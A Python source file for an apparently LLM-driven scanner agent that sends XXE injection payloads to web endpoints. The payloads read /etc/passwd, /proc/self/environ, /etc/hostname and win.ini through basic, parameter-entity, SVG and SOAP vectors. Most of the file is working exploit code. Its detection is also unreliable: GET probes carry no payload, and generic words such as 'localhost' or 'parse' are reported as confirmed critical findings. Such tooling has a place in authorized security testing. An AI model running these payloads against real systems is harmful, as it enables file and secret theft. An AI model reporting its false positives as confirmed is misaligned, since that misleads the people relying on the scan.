"""
XXE (XML External Entity) Injection Agent — Tests endpoints for XXE vulnerabilities.

Tests for:
1. Basic XXE with file:///etc/passwd external entity
2. Parameter entity XXE (<!ENTITY % xxe...>)
3. XXE via different file targets (hostname, environ, win.ini)
4. Blind XXE via error messages
5. XXE in SOAP envelopes
6. SVG XXE (image/XML upload endpoints)

Evidence: actual file content from response indicating successful file read.
Severity: Critical (confirmed file read via XXE is a severe vulnerability).

Usage — called by DecisionEngine:
    agent = XXEAgent(llm_backend="ollama")
    findings = agent.test_endpoint(endpoint, config, state)
"""

import httpx
from rich.console import Console
from agents.base import BaseAgent

console = Console()


class XXEAgent(BaseAgent):
    model = "claude-haiku-4-5-20251001"
    max_iterations = 10
    vuln_type = "xxe"
    agent_name = "XXEAgent"
    allowed_tools = []

    system_prompt = """\
You are an XML External Entity (XXE) injection specialist.
Test endpoints for XXE vulnerabilities by sending malicious XML payloads.
Focus on endpoints that accept XML content (Content-Type contains xml/soap) or POST endpoints.
"""

    def _deterministic_test(self, endpoint, config, state) -> list:
        """
        Override deterministic test for XXE.
        Tests endpoints that accept XML or are POST methods with custom XXE injection logic.
        """
        findings = []

        # Only test endpoints that might accept XML
        content_type = getattr(endpoint, 'content_type', '') or ''
        method = getattr(endpoint, 'method', 'GET') or 'GET'
        url = getattr(endpoint, 'url', '')

        if not url:
            return findings

        # Check if endpoint accepts XML (by content type or is POST)
        accepts_xml = 'xml' in content_type.lower() or 'soap' in content_type.lower()
        if not accepts_xml and method.upper() not in ('POST', 'PUT', 'PATCH'):
            return findings

        cookies = config.cookies if config.cookies else None

        # Try XXE via different vectors
        xxe_findings = self._test_xxe_vectors(url, method, cookies)
        findings.extend(xxe_findings)

        return findings

    def _test_xxe_vectors(self, url, method, cookies) -> list:
        """
        Test multiple XXE attack vectors.
        Returns list of finding dicts if XXE is confirmed.
        """
        findings = []
        client = httpx.Client(timeout=15, verify=False, follow_redirects=True)

        # File read targets with their markers
        file_targets = [
            {
                'path': 'file:///etc/passwd',
                'markers': ['root:x:', 'root:*:', 'root:0:0:', 'nobody:x:'],
                'name': '/etc/passwd (Unix)',
            },
            {
                'path': 'file:///etc/hostname',
                'markers': ['localhost', 'debian', 'ubuntu', 'centos'],
                'name': '/etc/hostname',
            },
            {
                'path': 'file:///proc/self/environ',
                'markers': ['PATH=', 'HOME=', 'USER=', 'SHELL='],
                'name': '/proc/self/environ (Unix environment)',
            },
            {
                'path': 'file:///c:/windows/win.ini',
                'markers': ['[fonts]', '[extensions]', '[files]'],
                'name': 'win.ini (Windows)',
            },
        ]

        # Test 1: Basic XXE with external entity
        console.print(f"  [dim]XXEAgent: testing {url} for basic XXE...[/]")
        for target in file_targets:
            xxe_payload = (
                '<?xml version="1.0"?>\n'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]>\n'
                '<root><data>&xxe;</data></root>'
            ).format(target['path'])

            try:
                if method.upper() == 'GET':
                    resp = client.get(url, cookies=cookies or {})
                else:
                    resp = client.post(url, content=xxe_payload, cookies=cookies or {},
                                     headers={'Content-Type': 'application/xml'})

                if resp.status_code == 200:
                    for marker in target['markers']:
                        if marker in resp.text:
                            console.print(
                                f"  [bold red][XXEAgent] CONFIRMED: XXE file read @ {url}[/]"
                            )
                            findings.append({
                                'validated': True,
                                'type': 'XML External Entity (XXE) Injection',
                                'url': url,
                                'method': method,
                                'param_name': '',
                                'payload': xxe_payload,
                                'evidence': (
                                    f"File read confirmed via XXE — marker '{marker}' found in response "
                                    f"for {target['name']}"
                                ),
                                'severity': 'Critical',
                                'source': self.agent_name,
                                'file_read': target['path'],
                            })
                            client.close()
                            return findings
            except Exception:
                pass

        # Test 2: Parameter entity XXE
        console.print(f"  [dim]XXEAgent: testing parameter entity XXE...[/]")
        for target in file_targets:
            pe_xxe = (
                '<?xml version="1.0"?>\n'
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}"> %xxe;]>\n'
                '<root>test</root>'
            ).format(target['path'])

            try:
                if method.upper() == 'GET':
                    resp = client.get(url, cookies=cookies or {})
                else:
                    resp = client.post(url, content=pe_xxe, cookies=cookies or {},
                                     headers={'Content-Type': 'application/xml'})

                if resp.status_code == 200:
                    for marker in target['markers']:
                        if marker in resp.text:
                            console.print(
                                f"  [bold red][XXEAgent] CONFIRMED: Parameter entity XXE @ {url}[/]"
                            )
                            findings.append({
                                'validated': True,
                                'type': 'XML External Entity (XXE) Injection',
                                'url': url,
                                'method': method,
                                'param_name': '',
                                'payload': pe_xxe,
                                'evidence': (
                                    f"Parameter entity XXE confirmed — marker '{marker}' found "
                                    f"for {target['name']}"
                                ),
                                'severity': 'Critical',
                                'source': self.agent_name,
                                'file_read': target['path'],
                            })
                            client.close()
                            return findings
            except Exception:
                pass

        # Test 3: Blind XXE via error messages
        console.print(f"  [dim]XXEAgent: testing blind XXE via errors...[/]")
        blind_xxe = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/file">]>\n'
            '<root>&xxe;</root>'
        )

        try:
            if method.upper() == 'GET':
                resp = client.get(url, cookies=cookies or {})
            else:
                resp = client.post(url, content=blind_xxe, cookies=cookies or {},
                                 headers={'Content-Type': 'application/xml'})

            if resp.status_code in (400, 500) and len(resp.text) > 100:
                error_patterns = [
                    'no such file', 'cannot open', 'file not found', 'open_basedir',
                    'entity', 'xml error', 'parse', 'doctype', 'entity reference',
                ]
                error_found = any(pat in resp.text.lower() for pat in error_patterns)
                if error_found:
                    console.print(
                        f"  [bold red][XXEAgent] CONFIRMED: Blind XXE via error @ {url}[/]"
                    )
                    findings.append({
                        'validated': True,
                        'type': 'XML External Entity (XXE) Injection',
                        'url': url,
                        'method': method,
                        'param_name': '',
                        'payload': blind_xxe,
                        'evidence': (
                            'Blind XXE confirmed via error message — server threw XML/entity exception'
                        ),
                        'severity': 'Critical',
                        'source': self.agent_name,
                    })
                    client.close()
                    return findings
        except Exception:
            pass

        # Test 4: SVG XXE (for image/XML upload endpoints)
        console.print(f"  [dim]XXEAgent: testing SVG XXE...[/]")
        for target in file_targets[:2]:  # Just test first 2 files for SVG
            svg_xxe = (
                '<?xml version="1.0"?>\n'
                '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{}">]>\n'
                '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
            ).format(target['path'])

            try:
                if method.upper() == 'GET':
                    resp = client.get(url, cookies=cookies or {})
                else:
                    resp = client.post(url, content=svg_xxe, cookies=cookies or {},
                                     headers={'Content-Type': 'image/svg+xml'})

                if resp.status_code == 200:
                    for marker in target['markers']:
                        if marker in resp.text:
                            console.print(
                                f"  [bold red][XXEAgent] CONFIRMED: SVG XXE @ {url}[/]"
                            )
                            findings.append({
                                'validated': True,
                                'type': 'XML External Entity (XXE) Injection',
                                'url': url,
                                'method': method,
                                'param_name': '',
                                'payload': svg_xxe,
                                'evidence': (
                                    f"SVG XXE confirmed — marker '{marker}' found in response"
                                ),
                                'severity': 'Critical',
                                'source': self.agent_name,
                                'file_read': target['path'],
                            })
                            client.close()
                            return findings
            except Exception:
                pass

        # Test 5: SOAP XXE (wrap payload in SOAP envelope)
        console.print(f"  [dim]XXEAgent: testing SOAP XXE...[/]")
        for target in file_targets[:1]:  # Just test passwd for SOAP
            soap_xxe = (
                '<?xml version="1.0"?>\n'
                '<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "{}">]>\n'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
                '  <soap:Body>\n'
                '    <data>&xxe;</data>\n'
                '  </soap:Body>\n'
                '</soap:Envelope>'
            ).format(target['path'])

            try:
                if method.upper() == 'GET':
                    resp = client.get(url, cookies=cookies or {})
                else:
                    resp = client.post(url, content=soap_xxe, cookies=cookies or {},
                                     headers={'Content-Type': 'application/soap+xml'})

                if resp.status_code == 200:
                    for marker in target['markers']:
                        if marker in resp.text:
                            console.print(
                                f"  [bold red][XXEAgent] CONFIRMED: SOAP XXE @ {url}[/]"
                            )
                            findings.append({
                                'validated': True,
                                'type': 'XML External Entity (XXE) Injection',
                                'url': url,
                                'method': method,
                                'param_name': '',
                                'payload': soap_xxe,
                                'evidence': (
                                    f"SOAP XXE confirmed — marker '{marker}' found in response"
                                ),
                                'severity': 'Critical',
                                'source': self.agent_name,
                                'file_read': target['path'],
                            })
                            client.close()
                            return findings
            except Exception:
                pass

        client.close()
        return findings

    def _get_default_severity(self) -> str:
        """XXE is always critical."""
        return "Critical"
